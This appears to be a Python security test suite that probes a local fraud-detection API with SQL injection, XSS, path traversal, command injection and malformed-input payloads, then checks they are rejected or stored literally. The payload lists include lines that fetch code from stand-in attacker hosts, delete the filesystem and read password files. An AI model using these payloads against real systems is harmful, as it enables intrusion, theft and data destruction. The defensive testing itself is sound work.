#!/usr/bin/env python3
"""
Security-focused Test Suite for Cybersecurity & Fraud Detection Platform API
Tests for security vulnerabilities, injection attacks, and malicious inputs
"""

import requests
import json
import time
import base64
from typing import Dict, Any
import uuid

# Test Configuration
BASE_URL = "http://localhost:8000"
API_BASE = f"{BASE_URL}/api"


class TestSQLInjection:
    """Test cases for SQL injection vulnerabilities"""
    
    def setup_method(self):
        """Setup test data before each test"""
        self.sql_injection_payloads = [
            "'; DROP TABLE events; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; UPDATE events SET event_type='hacked' WHERE 1=1; --",
            "' OR 1=1 #",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "'; INSERT INTO events VALUES ('fake'); --",
            "' AND (SELECT COUNT(*) FROM events) > 0 --"
        ]
    
    def test_sql_injection_in_event_type_filter(self):
        """Test SQL injection attempts in event_type parameter"""
        for payload in self.sql_injection_payloads:
            response = requests.get(f"{API_BASE}/events", params={"event_type": payload})
            
            # Should either return 422 (validation error) or 200 with no data
            assert response.status_code in [200, 422]
            
            if response.status_code == 200:
                data = response.json()
                # Should not return all events (which would indicate successful injection)
                assert "events" in data
                # If injection worked, we might see unexpected data
                for event in data["events"]:
                    assert event["event_type"] != "hacked"
    
    def test_sql_injection_in_user_id_filter(self):
        """Test SQL injection attempts in user_id parameter"""
        for payload in self.sql_injection_payloads:
            response = requests.get(f"{API_BASE}/events", params={"user_id": payload})
            
            assert response.status_code in [200, 422]
            
            if response.status_code == 200:
                data = response.json()
                assert "events" in data
    
    def test_sql_injection_in_alert_status_filter(self):
        """Test SQL injection attempts in alert status parameter"""
        for payload in self.sql_injection_payloads:
            response = requests.get(f"{API_BASE}/alerts", params={"status": payload})
            
            # Should return validation error for invalid status
            assert response.status_code == 422
    
    def test_sql_injection_in_event_creation(self):
        """Test SQL injection attempts in event creation"""
        base_event = {
            "event_type": "security",
            "source_system": "sql_injection_test",
            "severity": "high"
        }
        
        # Test injection in each string field
        injection_fields = ["source_system", "user_id", "device_id"]
        
        for field in injection_fields:
            for payload in self.sql_injection_payloads:
                event = base_event.copy()
                event[field] = payload
                
                response = requests.post(f"{API_BASE}/events", json=event)
                
                # Should either succeed (payload treated as literal string) or fail validation
                assert response.status_code in [201, 422]
                
                if response.status_code == 201:
                    # Verify the payload was stored as literal string, not executed
                    created_event = response.json()
                    assert created_event[field] == payload


class TestXSSPrevention:
    """Test cases for Cross-Site Scripting (XSS) prevention"""
    
    def setup_method(self):
        """Setup XSS test payloads"""
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<div onclick=alert('XSS')>",
            "';alert('XSS');//",
            "<script src='http://evil.com/xss.js'></script>",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;"
        ]
    
    def test_xss_in_event_creation(self):
        """Test XSS payload handling in event creation"""
        base_event = {
            "event_type": "security",
            "source_system": "xss_test",
            "severity": "medium"
        }
        
        string_fields = ["source_system", "user_id", "device_id"]
        
        for field in string_fields:
            for payload in self.xss_payloads:
                event = base_event.copy()
                event[field] = payload
                
                response = requests.post(f"{API_BASE}/events", json=event)
                
                # Should succeed and store as literal string
                assert response.status_code in [201, 422]
                
                if response.status_code == 201:
                    created_event = response.json()
                    # Verify XSS payload is stored as literal string
                    assert created_event[field] == payload
    
    def test_xss_in_event_data_json(self):
        """Test XSS payloads in JSON event_data field"""
        base_event = {
            "event_type": "security",
            "source_system": "xss_json_test",
            "severity": "medium",
            "event_data": {}
        }
        
        for payload in self.xss_payloads:
            event = base_event.copy()
            event["event_data"] = {
                "malicious_field": payload,
                "description": f"Test with payload: {payload}"
            }
            
            response = requests.post(f"{API_BASE}/events", json=event)
            assert response.status_code == 201
            
            created_event = response.json()
            assert created_event["event_data"]["malicious_field"] == payload


class TestInputValidation:
    """Test cases for input validation and sanitization"""
    
    def test_oversized_payloads(self):
        """Test handling of oversized payloads"""
        # Test extremely large string
        large_string = "A" * 100000  # 100KB string
        
        event = {
            "event_type": "security",
            "source_system": large_string,
            "severity": "high"
        }
        
        response = requests.post(f"{API_BASE}/events", json=event)
        # Should either succeed or fail gracefully
        assert response.status_code in [201, 413, 422, 500]
    
    def test_deeply_nested_json(self):
        """Test handling of deeply nested JSON structures"""
        # Create deeply nested structure
        nested_data = {"start": "value"}
        for i in range(100):  # 100 levels deep
            nested_data = {"level": nested_data}
        
        event = {
            "event_type": "security",
            "source_system": "nested_test",
            "severity": "medium",
            "event_data": nested_data
        }
        
        response = requests.post(f"{API_BASE}/events", json=event)
        # Should handle gracefully
        assert response.status_code in [201, 413, 422, 500]
    
    def test_unicode_and_emoji_handling(self):
        """Test handling of Unicode characters and emojis"""
        unicode_tests = [
            "用户名测试",  # Chinese
            "テストユーザー",  # Japanese
            "тестовый_пользователь",  # Russian
            "🔒🛡️🚨💻🌐",  # Security-related emojis
            "♠♥♦♣♪♫☀★",  # Various symbols
            "\u0000\u0001\u0002",  # Control characters
            "Test\x00User",  # Null byte
            "😀😃😄😁😆😅🤣😂",  # Various emojis
        ]
        
        for unicode_string in unicode_tests:
            event = {
                "event_type": "security",
                "source_system": "unicode_test",
                "user_id": unicode_string,
                "severity": "low"
            }
            
            response = requests.post(f"{API_BASE}/events", json=event)
            # Should handle Unicode gracefully
            assert response.status_code in [201, 422]
    
    def test_special_characters_handling(self):
        """Test handling of special characters"""
        special_chars = [
            "user@domain.com",
            "user#123",
            "user$pecial",
            "user%encoded",
            "user&entity",
            "user*wildcard",
            "user+plus",
            "user=equals",
            "user?query",
            "user|pipe",
            "user\\backslash",
            "user/slash",
            "user:colon",
            "user;semicolon",
            "user<less>",
            "user[bracket]",
            "user{brace}",
            "user\"quote",
            "user'apostrophe"
        ]
        
        for special_char in special_chars:
            event = {
                "event_type": "security",
                "source_system": "special_char_test",
                "user_id": special_char,
                "severity": "low"
            }
            
            response = requests.post(f"{API_BASE}/events", json=event)
            assert response.status_code == 201


class TestAuthenticationBypass:
    """Test cases for authentication bypass attempts"""
    
    def test_header_manipulation(self):
        """Test manipulation of request headers"""
        malicious_headers = {
            "X-Real-IP": "127.0.0.1",
            "X-Forwarded-For": "admin.localhost",
            "X-Originating-IP": "192.168.1.1",
            "X-Remote-IP": "10.0.0.1",
            "X-Client-IP": "172.16.0.1",
            "Authorization": "Bearer fake_token",
            "X-API-Key": "fake_api_key",
            "Cookie": "session=admin; role=administrator"
        }
        
        event = {
            "event_type": "security",
            "source_system": "header_test",
            "severity": "medium"
        }
        
        response = requests.post(f"{API_BASE}/events", json=event, headers=malicious_headers)
        # Should still work normally regardless of headers
        assert response.status_code == 201
    
    def test_parameter_pollution(self):
        """Test HTTP parameter pollution"""
        # Test with duplicate parameters
        url = f"{API_BASE}/events?limit=5&limit=1000&event_type=security&event_type=financial"
        
        response = requests.get(url)
        assert response.status_code == 200
        
        data = response.json()
        # Should handle parameter pollution gracefully
        assert len(data["events"]) <= 1000  # Should not exceed reasonable limit


class TestDenialOfService:
    """Test cases for Denial of Service (DoS) prevention"""
    
    def test_rapid_requests(self):
        """Test handling of rapid successive requests"""
        event = {
            "event_type": "security",
            "source_system": "dos_test",
            "severity": "low"
        }
        
        # Send 20 requests rapidly
        responses = []
        start_time = time.time()
        
        for i in range(20):
            response = requests.post(f"{API_BASE}/events", json=event, timeout=5)
            responses.append(response.status_code)
        
        end_time = time.time()
        
        # Should handle requests gracefully (may rate limit or process all)
        successful_requests = sum(1 for status in responses if status == 201)
        assert successful_requests >= 10  # At least half should succeed
        
        # Test should complete in reasonable time
        assert (end_time - start_time) < 30  # Should not hang
    
    def test_malformed_json_dos(self):
        """Test handling of malformed JSON that could cause DoS"""
        malformed_payloads = [
            '{"unclosed": "string',  # Unclosed string
            '{"nested": {"too": {"deep":',  # Incomplete nesting
            '{"number": 1.2.3}',  # Invalid number
            '{"duplicate": 1, "duplicate": 2}',  # Duplicate keys
            '{' + '"key":' * 1000 + '1}',  # Very large object
            '{"key": "' + 'A' * 100000 + '"}',  # Very large string value
        ]
        
        for payload in malformed_payloads:
            headers = {"Content-Type": "application/json"}
            response = requests.post(f"{API_BASE}/events", data=payload, headers=headers, timeout=10)
            
            # Should return error without crashing
            assert response.status_code in [400, 422, 500]


class TestDataLeakage:
    """Test cases for data leakage prevention"""
    
    def test_error_message_information_disclosure(self):
        """Test that error messages don't leak sensitive information"""
        # Test with invalid UUID that might reveal database info
        invalid_uuid = "definitely-not-a-uuid"
        response = requests.get(f"{API_BASE}/alerts/{invalid_uuid}/events")
        
        assert response.status_code == 422
        data = response.json()
        
        # Error message should not contain database details, file paths, or stack traces
        error_text = json.dumps(data).lower()
        sensitive_keywords = [
            "postgresql", "database", "/home/", "/var/", "traceback",
            "sqlalchemy", "psycopg2", "connection string", "password"
        ]
        
        for keyword in sensitive_keywords:
            assert keyword not in error_text
    
    def test_response_headers_security(self):
        """Test that response headers don't leak sensitive information"""
        response = requests.get(f"{API_BASE}/health")
        
        headers = response.headers
        
        # Should not reveal server details
        sensitive_headers = [
            "Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version"
        ]
        
        for header in sensitive_headers:
            if header in headers:
                # If present, should not contain version info
                assert "python" not in headers[header].lower()
                assert "fastapi" not in headers[header].lower()
                assert "uvicorn" not in headers[header].lower()


class TestInputSanitization:
    """Test cases for input sanitization"""
    
    def test_path_traversal_attempts(self):
        """Test path traversal attack prevention"""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for payload in path_traversal_payloads:
            event = {
                "event_type": "security",
                "source_system": payload,
                "user_id": payload,
                "device_id": payload,
                "severity": "medium"
            }
            
            response = requests.post(f"{API_BASE}/events", json=event)
            # Should treat as literal string, not file path
            assert response.status_code == 201
    
    def test_command_injection_attempts(self):
        """Test command injection prevention"""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(id)",
            "${PATH}",
            "; ping -c 1 google.com",
            "| curl http://evil.com",
            "&& wget http://malicious.com/script.sh"
        ]
        
        for payload in command_injection_payloads:
            event = {
                "event_type": "security",
                "source_system": f"test{payload}",
                "severity": "high"
            }
            
            response = requests.post(f"{API_BASE}/events", json=event)
            # Should treat as literal string, not execute commands
            assert response.status_code == 201


def run_security_tests():
    """Run all security tests"""
    print("🔒 Starting Security Test Suite")
    print("=" * 50)
    
    # Wait for server
    max_attempts = 10
    for i in range(max_attempts):
        try:
            response = requests.get(f"{BASE_URL}/docs", timeout=2)
            if response.status_code == 200:
                break
        except requests.exceptions.RequestException:
            pass
        time.sleep(1)
    else:
        print("❌ Server not responding. Make sure it's running on port 8000")
        return False
    
    test_classes = [
        TestSQLInjection,
        TestXSSPrevention,
        TestInputValidation,
        TestAuthenticationBypass,
        TestDenialOfService,
        TestDataLeakage,
        TestInputSanitization
    ]
    
    total_tests = 0
    passed_tests = 0
    failed_tests = []
    
    for test_class in test_classes:
        print(f"\n🛡️  Running {test_class.__name__}")
        print("-" * 40)
        
        test_instance = test_class()
        test_methods = [method for method in dir(test_instance) if method.startswith('test_')]
        
        for test_method in test_methods:
            total_tests += 1
            try:
                if hasattr(test_instance, 'setup_method'):
                    test_instance.setup_method()
                
                getattr(test_instance, test_method)()
                print(f"✅ {test_method}")
                passed_tests += 1
                
            except Exception as e:
                print(f"❌ {test_method}: {str(e)}")
                failed_tests.append(f"{test_class.__name__}.{test_method}: {str(e)}")
    
    # Summary
    print("\n" + "=" * 50)
    print("🔒 Security Test Results Summary")
    print("=" * 50)
    print(f"Total Security Tests: {total_tests}")
    print(f"✅ Passed: {passed_tests}")
    print(f"❌ Failed: {len(failed_tests)}")
    print(f"Security Score: {(passed_tests/total_tests)*100:.1f}%")
    
    if failed_tests:
        print("\n🚨 Failed Security Tests:")
        for failed_test in failed_tests:
            print(f"  - {failed_test}")
    
    if passed_tests == total_tests:
        print("\n🎉 All security tests passed! API appears secure against common attacks.")
    else:
        print(f"\n⚠️  {len(failed_tests)} security tests failed. Review the failures above.")
    
    return passed_tests == total_tests


if __name__ == "__main__":
    success = run_security_tests()
    exit(0 if success else 1)